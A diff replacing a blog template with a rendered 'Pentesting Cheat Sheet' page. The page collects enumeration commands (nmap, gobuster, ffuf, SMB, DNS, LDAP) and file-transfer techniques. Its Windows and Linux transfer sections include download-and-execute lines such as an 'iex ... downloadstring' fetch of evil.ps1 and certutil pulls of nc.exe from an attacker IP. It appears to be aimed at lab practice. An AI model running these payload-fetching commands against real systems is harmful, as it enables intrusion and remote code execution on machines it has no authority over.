@@ -1,19 +1,188 @@
-extends base
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="Queremos seguir aprendiendo y compartir nuestra passion por la Ciberseguridad"><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>Pentesting Cheat Sheet | ShadowDC</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 4.2.1"></head><link rel="stylesheet" type="text/css" href="/plugins/prettify/doxy.css"><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">ShadowDC</a></h1></div><p class="m-desc">心之所向，无惧无悔,<br>愿求仁得仁，复无怨怼！</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><section class="p-Pentesting Cheat Sheet p-ext p-common"><h1 class="page-title">Pentesting Cheat Sheet</h1><div class="p-content"><h1><span id="pentesting-cheat-sheet">Pentesting Cheat sheet</span><a href="#pentesting-cheat-sheet" class="header-anchor">#</a></h1><div class="toc">
 
-block title
-    title= __(page.title) + ' | ' + config.title
+<!-- toc -->
 
-block content
-    section(class='p-'+ page.title + ' p-ext p-common')
-        h1.page-title= __(page.title)
-        case page.title
-            when 'categories'
-                include categories.pug
-            when 'tags'
-                include tags.pug
 
-        .p-content
-            != page.content
 
-        if page.comments == true
-            include _partial/comments.pug
+<!-- tocstop -->
+
+</div>
+
+<h2><span id="potential-ports-vulnerabilities">Potential ports vulnerabilities</span><a href="#potential-ports-vulnerabilities" class="header-anchor">#</a></h2><ul>
+<li>21 [FTP] It’s possible have anonymous user.</li>
+<li>22 [SSH] It’s not probable have any vulnerabilities but is the best choise if found some credentials for try first. </li>
+<li>80 [HTTP] This is a web server. First detect the version about server it’s running, then try to find all directories and the virtual host.</li>
+<li>110 / 995(ssl) [POP3] This protocol used by email clients. Try the common passwords. </li>
+<li>143 / 993 [IMAP] Permit complete management of emails box by multiple email clients.</li>
+<li>445 [HTTPS] Like HTTP protocol it’s web server, and we can do the same. But we can enumerate SSL/TLS certificates on OpenSSL 1.1.0 and lower. </li>
+</ul>
+<h1><span id="enmeration">Enmeration!</span><a href="#enmeration" class="header-anchor">#</a></h1><h2><span id="port-scanning">Port Scanning</span><a href="#port-scanning" class="header-anchor">#</a></h2><p>Basic port scaning with bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> &#123;1..65535&#125;; <span class="keyword">do</span></span><br><span class="line">  timeout 1 bash -c <span class="string">"echo &gt;/dev/tcp/10.10.10.10/<span class="variable">$port</span>"</span> &amp;&amp;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"[*] <span class="variable">$port</span> is open"</span> ||</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"[*] <span class="variable">$port</span> is closed"</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="nmap">NMAP</span><a href="#nmap" class="header-anchor">#</a></h3><p><a href="https://nmap.org/" target="_blank" rel="noopener">https://nmap.org/</a></p>
+<blockquote>
+<p>Scripts define a list of categories they belong to. Currently defined categories are auth, broadcast, brute, default. discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln. Category names are not case sensitive. </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /urs/share/nmap/scripts</span><br></pre></td></tr></table></figure>
+
+<p>First nmap agressive scan for see all open ports</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5  -p- --open -v -n 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<p>When I have all open ports, I can do the second scan for enumeration with default script and the versions of the ports. Parameters -sC equals –script=default</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p22,80,445 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<p>ARP Scan</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -sn -PR 10.10.10.10/24</span><br></pre></td></tr></table></figure>
+
+<p>Reverse DNS Lookup</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sL 10.10.10.10/24</span><br></pre></td></tr></table></figure>
+
+<p>Using script </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -Pn --script <span class="string">"vuln and safe"</span> 10.10.10.10/24</span><br></pre></td></tr></table></figure>
+
+<h2><span id="http-tools">HTTP TOOLS</span><a href="#http-tools" class="header-anchor">#</a></h2><h3><span id="nikto">Nikto</span><a href="#nikto" class="header-anchor">#</a></h3><p><a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">https://github.com/sullo/nikto</a></p>
+<p>Nikto it’s nice tool to examine a web server to find potential problems and security vulnerabilities.</p>
+<p>Basic usage</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host https://10.10.10.10/</span><br></pre></td></tr></table></figure>
+
+<h3><span id="gobuster">Gobuster</span><a href="#gobuster" class="header-anchor">#</a></h3><p><a href="https://github.com/OJ/gobuster" target="_blank" rel="noopener">https://github.com/OJ/gobuster</a></p>
+<p>It’s a tool for use brute-force folders and multiple extensions at once.</p>
+<p>It has three main modes it can be used with:</p>
+<pre><code>dir - the classic directory brute-forcing mode
+dns - DNS subdomain brute-forcing mode
+vhost - virtual host brute-forcing mode </code></pre><p><code>DIR</code> mode </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster -w /usr/share/wordlists/dirb/common.txt dir -u http://10.10.10.10 -x php,txt,html,cgi</span><br></pre></td></tr></table></figure>
+<p><code>DNS</code> mode</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dns -d domain.com -w wordlist.txt -i</span><br></pre></td></tr></table></figure>
+<p><code>vhost</code> mode</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u domain.com -w wordlist.txt -v</span><br></pre></td></tr></table></figure>
+
+<h3><span id="wfuzz">WFUZZ</span><a href="#wfuzz" class="header-anchor">#</a></h3><p><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a></p>
+<p>Other tool for use brute-force like gobuster. I don’t want to do the same then i  will to put some example for scan a machine while HTTP are not accessible. We can return the ports request. </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c --hc=404 -z range,1-65535 http://10.10.10.10:8080/request_to=http://127.0.0.1:FUZZ</span><br></pre></td></tr></table></figure>
+
+<h3><span id="ffuf">FFUF</span><a href="#ffuf" class="header-anchor">#</a></h3><p><a href="https://github.com/ffuf/ffuf" target="_blank" rel="noopener">https://github.com/ffuf/ffuf</a></p>
+<p>This tool I realy like, because it’s written in go and i thik it’s the most faster for do this jobs.<br>This code works for scan a VHOST and the web page return every time the same size every time. </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://domain.com -H <span class="string">"Host: FUZZ.domain.com"</span> -fs 33 -<span class="built_in">fc</span> 401,403</span><br></pre></td></tr></table></figure>
+
+<h3><span id="dirsearch">DIRSEARCH</span><a href="#dirsearch" class="header-anchor">#</a></h3><p><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p>
+<p>This written in python. I like this tool becase it’s very fastter too and easy to use. </p>
+<p>This is my basic usage, do recursive.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://domain.com -E -r -w /usr/share/wordlist/wordlist.txt</span><br></pre></td></tr></table></figure>
+
+<h2><span id="smb-service">SMB SERVICE</span><a href="#smb-service" class="header-anchor">#</a></h2><p>This protocol enable to access files on remote server, as well other resources, including printers. </p>
+<h3><span id="llist-all-folders">Llist all folders</span><a href="#llist-all-folders" class="header-anchor">#</a></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.10.10.10</span><br><span class="line"></span><br><span class="line">smbmap -H 10.10.10.10</span><br><span class="line"></span><br><span class="line">/usr/share/doc/python3-impacket/examples/smbclient.py <span class="string">""</span> @10.10.10.10</span><br></pre></td></tr></table></figure>
+<h3><span id="generate-a-samba-server-with-impacket">Generate a samba server with Impacket</span><a href="#generate-a-samba-server-with-impacket" class="header-anchor">#</a></h3><p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py</a></p>
+<h4><span id="make-server-on-linux">Make server on Linux</span><a href="#make-server-on-linux" class="header-anchor">#</a></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver IGH /root/shells</span><br></pre></td></tr></table></figure>
+
+<h4><span id="mount-in-windows">Mount in Windows</span><a href="#mount-in-windows" class="header-anchor">#</a></h4><blockquote>
+<p>powershell </p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-PSDrive</span> <span class="literal">-Name</span> <span class="string">"IGH"</span> <span class="literal">-PSProvider</span> <span class="string">"Filesystem"</span> <span class="literal">-Root</span> <span class="string">"\\10.10.10.10\IGH"</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>without powershell</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use z: \\<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>\IGH"</span><br></pre></td></tr></table></figure>
+
+<h4><span id="mount-in-linux">Mount in Linux</span><a href="#mount-in-linux" class="header-anchor">#</a></h4><p>Is needed to have isntalled cifs-utils</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t cifs //10.10.10.10/igh ~/my-share/</span><br></pre></td></tr></table></figure>
+
+<h3><span id="enumeration-null-sessions">Enumeration null sessions</span><a href="#enumeration-null-sessions" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.10.10.10 -N</span><br><span class="line"></span><br><span class="line">rpcclient -U &quot;&quot; -N 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h3><span id="escaning-with-enum4linux">Escaning with enum4linux</span><a href="#escaning-with-enum4linux" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -a 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h2><span id="dns">DNS</span><a href="#dns" class="header-anchor">#</a></h2><h3><span id="nmap-dns-hostmanes-lookup">Nmap DNS hostmanes lookup</span><a href="#nmap-dns-hostmanes-lookup" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -f -dns-server [IP DNS] [target ip range]</span><br></pre></td></tr></table></figure>
+
+<p>Host lookup </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host -t ns 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<p>Perform DNS IP Lookup</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig a 10.10.10.10 @nameserver</span><br></pre></td></tr></table></figure>
+<p>Perform MX Record Lookup</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig mx 10.10.10.10 @nameserver</span><br></pre></td></tr></table></figure>
+<p>Perform Zone Transfer with dig</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig axfr 10.10.10.10 @nameserver</span><br></pre></td></tr></table></figure>
+<p>Windows DNS zone Transfer</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -&gt; set type&#x3D;any -&gt; ls -d 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<p>Linux DNS Zone Transfer </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig axfr 10.10.10.10 @nameserver</span><br></pre></td></tr></table></figure>
+
+<p>DNS Brute Force </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsrecon -d 10.10.10.10 -d &#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;dnsmap.txt -t std --xml output.xml</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2><span id="ldap-service">LDAP SERVICE</span><a href="#ldap-service" class="header-anchor">#</a></h2><p>Anonymous authentication, you will be able to perform a LDAP search query without binding to the admin account.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -h 10.10.10.10 -p 389 -x -b &quot;dc&#x3D;internetghost,dc&#x3D;com&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Admin account, sometimes you may to run ldap queries as the admin in order to have additionnal information presented to you.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -b &quot;dc&#x3D;internetghost,dc&#x3D;com&quot; -H ldap:&#x2F;&#x2F;10.10.10.10 -D &quot;cn&#x3D;admin,dc&#x3D;internetghost,dc&#x3D;com&quot; -W</span><br></pre></td></tr></table></figure>
+
+<h2><span id="transfer-files">Transfer files</span><a href="#transfer-files" class="header-anchor">#</a></h2><h3><span id="http">HTTP</span><a href="#http" class="header-anchor">#</a></h3><h4><span id="python">PYTHON</span><a href="#python" class="header-anchor">#</a></h4><p>You can create a temporal http server with python</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure>
+<p>It also can specify which path to share</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000 --dir &#x2F;root&#x2F;shells</span><br></pre></td></tr></table></figure>
+
+<h4><span id="windows">WINDOWS</span><a href="#windows" class="header-anchor">#</a></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iex(<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">"http://10.10.10.10/evil.ps1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">certutil.exe -urlcache -split -f "</span>http://<span class="number">10.10</span>.<span class="number">10.10</span>/nc.exe<span class="string">" nc.exe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">IWR -Uri "</span>http://<span class="number">10.10</span>.<span class="number">10.10</span>/n64.exe<span class="string">" -Outfile "</span>n64.exe<span class="string">"</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4><span id="linux">LINUX</span><a href="#linux" class="header-anchor">#</a></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.10/evil.php</span><br></pre></td></tr></table></figure>
+
+<h3><span id="netcat">NETCAT</span><a href="#netcat" class="header-anchor">#</a></h3><p>Hacker Machine</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444 &lt; file</span><br></pre></td></tr></table></figure>
+
+<p>Victim machine </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.10.10.10 4444 &gt; file</span><br></pre></td></tr></table></figure>
+
+<h3><span id="ssh-scp">SSH - SCP</span><a href="#ssh-scp" class="header-anchor">#</a></h3><p>The methodology is the same, but I prefer transfer write different methods in this example.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file</span></span><br><span class="line">spc /<span class="built_in">local</span>/folder/file.txt user@10.10.10.10:/path/folder/file.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># folder</span></span><br><span class="line">spc -r user@10.10.10.10:/folder /path/folder/</span><br></pre></td></tr></table></figure>
+
+<h3><span id="samba">SAMBA</span><a href="#samba" class="header-anchor">#</a></h3><h4><span id="bash">BASH</span><a href="#bash" class="header-anchor">#</a></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-smbserver smbFolder $(<span class="built_in">pwd</span>)</span><br></pre></td></tr></table></figure>
+<h4><span id="powershell">Powershell</span><a href="#powershell" class="header-anchor">#</a></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; <span class="built_in">New-PSDrive</span> <span class="literal">-Name</span> <span class="string">"SharedFolder"</span> <span class="literal">-PSProvider</span> <span class="string">"FileSystem"</span> <span class="literal">-Root</span> <span class="string">"\\10.10.14.18\smbFolder"</span> </span><br><span class="line">PS&gt; dir SharedFolder:\</span><br></pre></td></tr></table></figure>
+
+<h4><span id="using-credentials">Using Credentials</span><a href="#using-credentials" class="header-anchor">#</a></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-smbserver smbFolder $(<span class="built_in">pwd</span>) -smb2support -user jack -password 1234</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS &gt; <span class="variable">$pass</span>= <span class="built_in">convertto-securestring</span> <span class="string">'1234'</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line">PS &gt; <span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Managment.Automation.PSCredential(<span class="string">'jack'</span>, <span class="variable">$pass</span>)</span><br><span class="line">PS &gt; <span class="built_in">New-PSDrive</span> <span class="literal">-Name</span> <span class="string">"SharedFolder"</span> <span class="literal">-PSProvider</span> <span class="string">"FileSystem"</span> <span class="literal">-Credential</span> <span class="variable">$cred</span>  <span class="literal">-Root</span> <span class="string">"\\10.10.14.18\smbFolder"</span></span><br></pre></td></tr></table></figure>
+
+
+</div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2020 <a href="/." rel="nofollow">ShadowDC</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/plugins/prettify/prettify.js"></script><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
